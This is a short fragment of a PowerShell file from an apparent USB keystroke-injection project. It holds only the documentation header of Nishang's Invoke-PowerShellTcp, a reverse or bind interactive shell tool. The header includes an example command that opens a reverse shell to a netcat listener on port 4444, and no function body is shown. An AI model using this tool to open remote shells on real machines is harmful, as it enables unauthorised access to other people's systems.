# USB-Rubbery-Duckky
File: PS.ps1
function Invoke-PowerShellTcp
{
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell fron a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from powerfun written by Ben Turner & Dave Hardy 

PARAMETER IPAddress
Thw IP address to connect to when using the -Reverse switch.

PARAMETER port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

EXAMPLE 
PS > Invoke-PowerShellTcp -Reverse .IPAddress .port 4444

